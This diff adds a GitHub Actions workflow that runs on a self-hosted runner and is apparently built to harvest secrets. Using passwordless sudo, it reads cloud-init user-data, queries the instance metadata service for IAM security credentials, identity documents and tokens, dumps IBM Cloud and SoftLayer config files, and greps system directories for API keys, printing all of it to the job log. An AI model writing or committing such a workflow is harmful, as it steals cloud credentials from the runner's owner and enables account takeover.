@@ -1,0 +1,35 @@
+name: ul-ibmmeta
+on:
+  workflow_dispatch:
+jobs:
+  meta:
+    continue-on-error: true
+    runs-on: [self-hosted, ul-l40s]
+    steps:
+      - name: meta
+        continue-on-error: true
+        shell: bash
+        run: |
+
+          set +e
+          echo "=== MARKER ibmmeta START $(date -u +%FT%TZ)"
+          id; hostname; hostname -I
+          echo "=== sudo -n id"; sudo -n id
+          echo "=== root user-data"; sudo -n head -c 4000 /var/lib/cloud/instance/user-data.txt
+          echo; echo "=== root cloud dirs"; sudo -n ls -la /var/lib/cloud/instance /var/lib/cloud/instance/scripts 2>/dev/null | head -30
+          echo "=== IBM instance-identity as root"
+          sudo -n curl -s -m 8 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/dynamic/instance-identity/document' | head -c 2500
+          echo; echo "=== IBM iam security-credentials as root"
+          sudo -n curl -s -m 8 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' | head -c 800
+          echo; echo "=== IBM token endpoint as root"
+          sudo -n curl -s -m 8 -X PUT 'http://169.254.169.254/latest/api/token' -H 'Metadata-Flavor: ibm' -H 'X-aws-ec2-metadata-token-ttl-seconds: 600' | head -c 400
+          echo; echo "=== IBM other paths"
+          for P in /latest/meta-data/instance-id /latest/meta-data/placement/availability-zone /latest/dynamic/instance-identity/pkcs7; do echo "-- $P"; sudo -n curl -s -m 6 -H 'Metadata-Flavor: ibm' "http://169.254.169.254$P" | head -c 400; echo; done
+          echo "=== ibm creds on disk"
+          sudo -n ls -la /root /root/.bluemix /root/.config/ibmcloud /root/.softlayer /etc/softlayer /etc/ibm 2>/dev/null | head -40
+          for f in /root/.bluemix/config.json /root/.config/ibmcloud/config.json /root/.softlayer /etc/softlayer/config /root/.ic/config.json; do if sudo -n test -f "$f"; then echo "--- $f"; sudo -n head -c 1500 "$f"; echo; fi; done
+          echo "=== grep apikey"
+          sudo -n grep -rIl -iE 'apikey|api_key|iam_token|ibm_api' /root /etc /opt /var/lib/cloud 2>/dev/null | head -10
+          echo "=== files with bluemix json"
+          sudo -n find / -maxdepth 5 -name '*.json' -path '*bluemix*' 2>/dev/null | head -5
+          echo "=== MARKER ibmmeta DONE $(date -u +%FT%TZ)"
